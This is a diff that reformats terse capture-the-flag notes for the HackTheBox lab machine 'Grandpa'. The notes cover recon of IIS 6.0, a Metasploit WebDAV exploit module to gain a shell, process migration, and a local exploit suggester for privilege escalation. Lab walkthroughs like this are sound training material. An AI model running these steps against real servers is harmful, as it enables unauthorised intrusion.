@@ -1,18 +1,18 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Grandpa
-# 19/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.10.14
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 80/tcp open  http    Microsoft IIS httpd 6.0
 
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 msf6 > search IIS 6.0
 use windows/iis/iis_webdav_scstoragepathfromurl
 set options
@@ -20,9 +20,7 @@ you got shell
 
 migrate with other ps like davcdata.exe
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 use multi/recon/local_exploit_suggester
 set options run
 
